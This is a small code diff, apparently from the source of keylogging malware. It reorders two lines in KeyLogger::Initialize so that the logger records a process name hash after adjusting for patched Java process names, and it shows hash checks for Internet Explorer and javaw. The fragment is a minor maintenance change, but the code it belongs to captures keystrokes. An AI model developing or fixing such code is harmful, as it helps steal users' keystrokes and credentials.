@@ -1234,8 +1234,6 @@ PKeyLogger KeyLogger::Initialize(PCHAR AppName)
 	PCHAR FileName = File::ExtractFileNameA(AppName, false);
     DWORD H = STR::GetHash(FileName, 0, true);
 
-	Logger->ProcessName = STR::New(AppName);
-	Logger->ProcessNameHash = H;
 
 	#ifdef JAVS_PATCHERH
 		// При срабатывании чва патчера оригинальные имена процессов
@@ -1247,6 +1245,9 @@ PKeyLogger KeyLogger::Initialize(PCHAR AppName)
 		if (H == AnsiStr::Hash(Patched_JawaW_Name, 0, true))
 			H = PROCESS_HASH_JAVAW;
 	#endif
+
+	Logger->ProcessName = STR::New(AppName);
+	Logger->ProcessNameHash = H;
 
 	// Пробуем определить в каком процессе работаем
 	if (H == PROCESS_HASH_IE)
